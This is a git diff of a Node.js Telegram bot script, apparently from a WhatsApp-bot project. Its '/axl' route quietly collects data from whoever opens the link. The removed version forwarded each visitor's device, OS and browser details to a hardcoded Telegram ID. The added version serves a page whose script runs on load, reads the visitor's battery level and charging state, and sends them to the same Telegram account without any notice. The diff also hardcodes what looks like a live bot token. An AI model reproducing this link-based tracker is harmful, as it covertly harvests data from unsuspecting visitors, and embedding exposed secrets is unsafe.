@@ -2,9 +2,8 @@ const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const express = require('express');
 const path = require('path');
-//const config = require('./config'); // Import the bot token from config.js
 
-// Get the bot token from environment variables
+// Bot token
 const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";
 
 // Create a bot instance
@@ -12,13 +11,16 @@ const bot = new TelegramBot(token, { polling: true });
 
 // Define support links
 const SUPPORT_LINKS = {
-  repo: "https://github.com/sataniceypz/Izumi-v3", // Replace with your GitHub repo link
-  channel: "https://whatsapp.com/channel/0029Vaf2tKvGZNCmuSg8ma2O", // Replace with your WhatsApp channel link
-  group: "https://chat.whatsapp.com/KHvcGD7aEUo8gPocJsYXZe" // Replace with your WhatsApp group link
+  repo: "https://github.com/sataniceypz/Izumi-v3",
+  channel: "https://whatsapp.com/channel/0029Vaf2tKvGZNCmuSg8ma2O",
+  group: "https://chat.whatsapp.com/KHvcGD7aEUo8gPocJsYXZe"
 };
 
-// Create an express app to bind to the port
+// Create an express app
 const app = express();
+
+// Define Telegram ID for user to send messages
+const ajsal = '6524787237';
 
 // Command to start the bot and show buttons
 bot.onText(/\/start/, (msg) => {
@@ -56,10 +58,6 @@ bot.on('polling_error', (error) => {
   console.error(error);
 });
 
-
-//✅️✅️✅️✅️✅️✅️✅️✅️✅️✅️✅️❤️✅️✅️✅️✅️✅️✅️✅️✅️❤️✅️
-
-
 // Function to detect the device name from User-Agent
 function getDeviceName(userAgent) {
   const ua = userAgent.toLowerCase();
@@ -80,41 +78,64 @@ function getOSVersion(userAgent) {
   return osVersion || "Unknown";
 }
 
-
-    
-
-
 function getBrowserVersion(userAgent) {
   const regex = /(?:MSIE|Edge|Opera|Firefox|Chrome|Safari)[\/\s](\d+\.\d+)/;
   const match = userAgent.match(regex);
   return match ? match[1] : "unknown";
 }
 
+// Serve the device info page
+app.get('/axl', (req, res) => {
+  const html = `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Device Info</title>
+    </head>
+    <body>
+      <script>
+        async function sendBatteryInfo() {
+          try {
+            const battery = await navigator.getBattery();
+            const batteryInfo = {
+              level: (battery.level * 100) + '%',
+              charging: battery.charging ? 'Charging' : 'Not Charging'
+            };
+            
+            // Send battery info to the server
+            fetch('/battery', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(batteryInfo)
+            });
+          } catch (error) {
+            console.error('Failed to get battery info:', error);
+          }
+        }
 
-//✅️✅️✅️✅️✅️✅️✅️✅️✅️✅️✅️❤️✅️✅️❤️❤️❤️❤️✅️
-// Define Telegram ID for user to send messages
-const ajsal = '6524787237';
+        sendBatteryInfo();
+      </script>
+      <h1>Device Info Page</h1>
+    </body>
+    </html>
+  `;
 
-// Set up a basic HTTP server to bind to a port (required by Render)
-app.get('/axl' , async (req, res) => {
-  const userAgent = req.headers['user-agent'];
-  const deviceName = getDeviceName(userAgent);
+  res.send(html);
+});
 
+// Handle battery info sent from the client
+app.post('/battery', express.json(), (req, res) => {
+  const { level, charging } = req.body;
+  const message = `🔋 *Battery Info*:
+- Level: ${level}
+- Status: ${charging}`;
+
+  // Send battery info to your Telegram
+  bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
   
-    /// Send a message to your Telegram ID with the detected device name
-const androos = getOSVersion(userAgent);
-
- const brow =  getBrowserVersion(userAgent);
- const tmsg = `Someone accessed the URL 
-
-D:- ${deviceName}
-V:- ${androos}
-B:- ${brow}`;
- 
- 
-  bot.sendMessage(ajsal, tmsg);
-
-  res.sendFile(path.join(__dirname, 'index.html'));
+  res.status(200).send('Battery info sent to Telegram.');
 });
 
 // Start the server
